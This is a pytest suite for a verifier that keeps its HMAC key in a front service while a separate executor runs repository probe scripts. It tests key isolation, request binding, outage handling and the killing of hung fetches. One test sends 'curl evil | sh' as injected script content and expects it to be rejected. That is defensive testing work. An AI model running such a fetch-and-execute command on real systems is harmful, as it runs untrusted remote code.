"""Front/executor split: the HMAC key never reaches the process that runs repository code,
the front forwards only bound identities, and hung fetches are killed as a whole."""

import asyncio
import json
import shutil
import time
from pathlib import Path

import httpx
import pytest
from test_probe_runner import (
    REGISTRY,
    SECRET,
    _git_repo,
    _post,
    _register,
    _request,
    _signed,
    _spec,
)

import remediator.probes.runner as runner_module
import remediator.verifier as verifier_module
from remediator.probes.runner import PROBE_RUN_MARKER, LocalProbeRunner, marked_pids
from remediator.verifier import VerifierConfig, create_app
from remediator.verifier.executor import ExecutorConfig, create_executor_app

pytestmark = pytest.mark.skipif(
    shutil.which("git") is None or shutil.which("bash") is None, reason="git/bash required"
)


def _executor_env(tmp_path: Path, **env: str) -> dict[str, str]:
    (tmp_path / REGISTRY).mkdir(exist_ok=True)
    return {
        "VERIFIER_CLONE_URL_FORMAT": "https://example.invalid/{repository}.git",
        "VERIFIER_WORKSPACE_ROOT": str(tmp_path),
        "VERIFIER_PROBE_ROOT": str(tmp_path / REGISTRY),
        "VERIFIER_MAX_TIMEOUT_SECONDS": "30",
        "VERIFIER_REPOSITORY_ALLOWLIST": "acme/demo",
        "VERIFIER_MAX_PROCESSES": "",
        "VERIFIER_EGRESS_CHECK": "off",
        "VERIFIER_EGRESS_PROXY_URL": "http://egress-proxy:3128",
        **env,
    }


def _split_pair(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, **env: str
) -> tuple[httpx.AsyncClient, httpx.AsyncClient]:
    """A front in runner mode talking to an executor app over an in-memory transport."""
    monkeypatch.setattr(runner_module, "credential_exposure", lambda **_: [])
    monkeypatch.setattr(verifier_module, "kill_stray_processes", lambda: 0)
    import remediator.verifier.executor as executor_module

    monkeypatch.setattr(executor_module, "kill_stray_processes", lambda: 0)
    exec_cfg = ExecutorConfig(_executor_env(tmp_path, **env))
    exec_cfg.clone_url_format = f"file://{tmp_path}/origin/{{repository}}.git"
    executor_app = create_executor_app(exec_cfg)
    executor_client = httpx.AsyncClient(
        transport=httpx.ASGITransport(app=executor_app), base_url="http://verifier-runner:8081"
    )
    front_cfg = VerifierConfig(
        {
            **_executor_env(tmp_path, **env),
            "VERIFIER_HMAC_KEY": SECRET,
            "VERIFIER_RUNNER_URL": "http://verifier-runner:8081",
        }
    )
    front_app = create_app(front_cfg, executor_client=executor_client)
    front = httpx.AsyncClient(
        transport=httpx.ASGITransport(app=front_app), base_url="http://verifier"
    )
    return front, executor_client


def test_executor_config_holds_no_key_and_refuses_concurrency(tmp_path: Path) -> None:
    cfg = ExecutorConfig(_executor_env(tmp_path))
    assert not hasattr(cfg, "hmac_key")
    assert cfg.child_env()["HTTPS_PROXY"] == "http://egress-proxy:3128"
    assert cfg.child_env()["NO_PROXY"] == "localhost,127.0.0.1"
    assert ExecutorConfig(_executor_env(tmp_path, VERIFIER_EGRESS_PROXY_URL="")).child_env() == {}
    with pytest.raises(ValueError, match="VERIFIER_MAX_CONCURRENT must be 1"):
        ExecutorConfig(_executor_env(tmp_path, VERIFIER_MAX_CONCURRENT="2"))
    with pytest.raises(ValueError, match="http://"):
        ExecutorConfig(_executor_env(tmp_path, VERIFIER_EGRESS_PROXY_URL="socks5://x"))


def test_front_in_runner_mode_needs_a_runner_url(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="VERIFIER_RUNNER_URL"):
        VerifierConfig({**_executor_env(tmp_path), "VERIFIER_HMAC_KEY": SECRET})
    with pytest.raises(ValueError, match="VERIFIER_EXECUTION"):
        VerifierConfig(
            {**_executor_env(tmp_path), "VERIFIER_HMAC_KEY": SECRET, "VERIFIER_EXECUTION": "x"}
        )


async def test_split_front_reports_runner_execution_and_forwards_bound_requests(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _, sha = _git_repo(tmp_path)
    probe = await _register(tmp_path, sha, "env | sort\nexit 1\n")
    front, executor = _split_pair(tmp_path, monkeypatch)
    async with front, executor:
        caps = await front.get("/capabilities", headers=_signed(b""))
        assert caps.status_code == 200
        payload = caps.json()
        assert payload["execution"] == "runner"
        assert payload["isolation"]["egress_proxy_configured"] is True
        assert payload["isolation"]["direct_egress"] is None  # check disabled in tests

        # Unsigned requests never reach the executor; the executor itself takes no signature.
        unsigned = await front.post("/probe", content=json.dumps(_request(probe, sha)).encode())
        assert unsigned.status_code == 401

        response = await _post(front, _request(probe, sha))
        assert response.status_code == 200, response.text
        body = response.json()
        assert body["exit_code"] == 1 and body["infrastructure_error"] is None
        assert body["replayed"] is False
        # The probe saw the proxy routing, but neither the key nor the key file path.
        assert "HTTPS_PROXY=http://egress-proxy:3128" in body["stdout"]
        assert SECRET not in body["stdout"]
        assert "VERIFIER_HMAC_KEY" not in body["stdout"]

        replay = await _post(front, {**_request(probe, sha), "request_id": body["request_id"]})
        assert replay.status_code == 200 and replay.json()["replayed"] is True


async def test_executor_refuses_what_the_front_refuses(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Binding is enforced twice: a request that reaches the executor without the front (or
    forged by a probe on loopback) still cannot name a script or leave the registry."""
    _, sha = _git_repo(tmp_path)
    probe = await _register(tmp_path, sha, "exit 1\n")
    _, executor = _split_pair(tmp_path, monkeypatch)
    async with executor:
        wrong_hash = {**_request(probe, sha), "script_hash": "f" * 64}
        response = await executor.post("/run", content=json.dumps(wrong_hash).encode())
        assert response.status_code == 409
        other_repo = {**_request(probe, sha), "repository": "acme/other"}
        response = await executor.post("/run", content=json.dumps(other_repo).encode())
        assert response.status_code == 403
        with_script = {**_request(probe, sha), "script_content": "curl evil | sh"}
        response = await executor.post("/run", content=json.dumps(with_script).encode())
        assert response.status_code == 422
        health = await executor.get("/health")
        assert health.status_code == 200
        assert health.json()["in_flight"] == 0
        assert "hmac" not in health.text.lower()


async def test_front_maps_executor_outage_to_infrastructure_failure(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _, sha = _git_repo(tmp_path)
    probe = await _register(tmp_path, sha, "exit 1\n")
    monkeypatch.setattr(verifier_module, "kill_stray_processes", lambda: 0)

    def down(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("refused", request=request)

    cfg = VerifierConfig(
        {
            **_executor_env(tmp_path),
            "VERIFIER_HMAC_KEY": SECRET,
            "VERIFIER_RUNNER_URL": "http://verifier-runner:8081",
        }
    )
    app = create_app(cfg, executor_client=httpx.AsyncClient(transport=httpx.MockTransport(down)))
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://verifier"
    ) as front:
        caps = await front.get("/capabilities", headers=_signed(b""))
        assert caps.status_code == 503
        response = await _post(front, _request(probe, sha))
        assert response.status_code == 200
        body = response.json()
        assert body["exit_code"] is None
        assert body["failure_stage"] == "preflight"
        assert "executor unreachable" in body["infrastructure_error"]


async def test_front_rejects_an_executor_answer_for_another_execution(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _, sha = _git_repo(tmp_path)
    probe = await _register(tmp_path, sha, "exit 1\n")
    monkeypatch.setattr(verifier_module, "kill_stray_processes", lambda: 0)
    front, executor = _split_pair(tmp_path, monkeypatch)
    async with front, executor:
        honest = (await _post(front, _request(probe, sha))).json()

    def swap(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={**honest, "exit_code": 0, "commit_sha": "b" * 40})

    cfg = VerifierConfig(
        {
            **_executor_env(tmp_path),
            "VERIFIER_HMAC_KEY": SECRET,
            "VERIFIER_RUNNER_URL": "http://verifier-runner:8081",
        }
    )
    app = create_app(cfg, executor_client=httpx.AsyncClient(transport=httpx.MockTransport(swap)))
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://verifier"
    ) as front:
        body = (await _post(front, _request(probe, sha))).json()
        assert body["exit_code"] is None
        assert "different execution" in body["infrastructure_error"]


async def test_hung_fetch_is_killed_with_its_process_group(tmp_path: Path) -> None:
    """A remote that accepts and never answers: the fetch must time out, the git process
    tree must be gone and the run must be reported as a fetch infrastructure failure."""
    accepted: list[asyncio.StreamWriter] = []

    async def black_hole(_: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        accepted.append(writer)
        await asyncio.sleep(3600)

    server = await asyncio.start_server(black_hole, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    runner = LocalProbeRunner(
        f"git://127.0.0.1:{port}/{{repository}}",
        workspace_root=tmp_path,
        fetch_timeout_seconds=1.0,
    )
    runner.credential_check = lambda: []
    seen: dict[str, str] = {}
    original = runner._fetch_exact_commit  # noqa: SLF001

    async def spy(repo_dir: Path, spec: object, env: dict[str, str]) -> str | None:
        seen["marker"] = env[PROBE_RUN_MARKER]
        return await original(repo_dir, spec, env)  # type: ignore[arg-type]

    runner._fetch_exact_commit = spy  # type: ignore[method-assign]
    started = time.monotonic()
    try:
        result = await runner.run(_spec("a" * 40, "exit 0\n", timeout=10))
    finally:
        server.close()
        for writer in accepted:
            writer.close()
        # Python 3.12 wait_closed() blocks on the sleeping handlers; closing is enough here.
    assert time.monotonic() - started < 10
    assert result.failure_stage == "fetch"
    assert result.infrastructure_error is not None and "timed out" in result.infrastructure_error
    assert accepted, "git never connected to the black-hole remote"
    assert marked_pids(seen["marker"]) == []
    assert not list(tmp_path.glob("probe-*")), "workspace must be removed after a hung fetch"
